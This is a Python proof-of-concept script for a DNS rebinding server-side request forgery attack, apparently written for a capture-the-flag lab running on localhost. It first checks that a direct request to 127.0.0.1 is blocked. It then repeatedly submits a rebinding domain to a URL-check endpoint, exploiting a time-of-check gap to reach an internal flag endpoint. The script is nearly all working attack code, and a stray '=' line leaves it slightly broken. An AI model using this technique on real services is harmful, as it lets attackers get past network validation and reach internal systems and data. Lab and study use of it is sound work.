
"""
Simple DNS Rebinding SSRF PoC
Uses rbndr.us public service to exploit TOCTOU vulnerability
"""

import requests
import time
import sys

TARGET = "http://localhost:8000"
ENDPOINT = "/ssrf/dns-rebinding/check-availability"

REBIND_DOMAIN = "7f000001.28292a2b.rbndr.us"

INTERNAL_PATH = "/internal/flag"

def test_direct_ip():
    """Test that direct IP access is blocked"""
    print("[Step 1] Testing direct IP access (should be blocked)...")
    print(f"URL: http://127.0.0.1{INTERNAL_PATH}\n")

    response = requests.post(
        f"{TARGET}{ENDPOINT}",
        json={"url": f"http://127.0.0.1{INTERNAL_PATH}"},
        timeout=15
    )

    print(f"Status: {response.status_code}")
    print(f"Response: {response.json()}\n")

    if response.json().get('error') == 'Access denied':
        print("‚úì Security working: Direct IP blocked\n")
        return True
    else:
        print("‚úó Security broken: Direct IP should be blocked!\n")
        return False

def exploit_dns_rebinding(max_attempts=20):
    """Exploit DNS rebinding to bypass IP validation"""
    print(f"[Step 2] DNS Rebinding Attack...")
    print(f"URL: http://{REBIND_DOMAIN}{INTERNAL_PATH}")
    print(f"Attempting up to {max_attempts} times (DNS responses are random)\n")

    for attempt in range(1, max_attempts + 1):
        print(f"Attempt {attempt}/{max_attempts}: ", end='', flush=True)

        try:
            response = requests.post(
                f"{TARGET}{ENDPOINT}",
                json={"url": f"http://{REBIND_DOMAIN}{INTERNAL_PATH}"},
                timeout=15
            )

            data = response.json()

          =
            if 'data' in data and 'SSRF{' in str(data['data']):
                print("‚úì SUCCESS!\n")
                print("=" * 60)
                print("  üéØ EXPLOIT SUCCESSFUL!")
                print("=" * 60)


                flag_data = data['data']
                if isinstance(flag_data, str):
                    import json
                    try:
                        flag_json = json.loads(flag_data)
                        flag = flag_json.get('flag', flag_data)
                    except:
                        flag = flag_data
                else:
                    flag = flag_data.get('flag', str(flag_data))

                print(f"\nFLAG: {flag}\n")
                print("How it worked:")
                print("  1. DNS Query #1 ‚Üí 40.41.42.43 (SAFE)")
                print("  2. Validation PASSED ‚úì (not private IP)")
                print("  3. sleep(2) seconds ‚Üê TOCTOU window")
                print("  4. DNS Query #2 ‚Üí 127.0.0.1 (REBIND!)")
                print("  5. Accessed internal endpoint")
                print("=" * 60)
                return True

            elif data.get('error') == 'Access denied':
                print("‚úó Blocked (safe IP on both queries)")

            elif 'Failed' in str(data.get('error', '')):
                print("‚ö† Failed (127.0.0.1 on first query)")

            else:
                print(f"? Unknown: {data}")

        except requests.exceptions.Timeout:
            print("‚è± Timeout")
        except Exception as e:
            print(f"‚úó Error: {e}")


        if attempt < max_attempts:
            time.sleep(1)

    print(f"\n‚úó Failed after {max_attempts} attempts")
    print("Try running the script again (DNS responses are random)")
    return False

def main():
    print("=" * 60)
    print("  DNS Rebinding SSRF PoC")
    print("=" * 60)
    print(f"\nTarget: {TARGET}{ENDPOINT}")
    print(f"Rebinding Domain: {REBIND_DOMAIN}")
    print("  ‚Üí Alternates between:")
    print("    ‚Ä¢ 127.0.0.1 (internal - target)")
    print("    ‚Ä¢ 40.41.42.43 (external - safe)\n")
    print("=" * 60)
    print()


    if not test_direct_ip():
        print("‚ö† Warning: Direct IP should be blocked!")
        sys.exit(1)

    print("=" * 60)
    print()


    success = exploit_dns_rebinding(max_attempts=20)

    if success:
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n‚ö† Interrupted by user")
        sys.exit(130)
